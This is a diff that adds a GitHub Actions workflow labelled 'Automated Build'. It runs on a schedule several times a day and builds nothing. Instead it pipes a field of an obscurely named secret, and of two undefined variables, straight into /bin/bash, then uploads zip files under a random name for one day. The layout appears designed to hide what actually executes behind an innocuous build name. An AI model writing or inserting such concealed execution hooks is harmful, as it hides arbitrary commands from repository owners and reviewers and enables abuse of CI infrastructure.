@@ -1,0 +1,31 @@
+name: Automated Build
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '30 4,10,16,22 * * *'
+permissions:
+  contents: read
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  ci:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+      - name: Launch
+        env:
+          sqas4847: ${{ secrets.sqas4847 }}
+        run: |
+          printf '%s' "$sqas4847" | jq -r .uoj8654 | /bin/bash
+          echo $wpn793 | jq -r .ur04 | /bin/bash
+          echo $bsudp28576 | jq -r .wls48 | /bin/bash
+
+      - name: Save artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: YrlTZbqo
+          path: "*.zip"
+          retention-days: 1
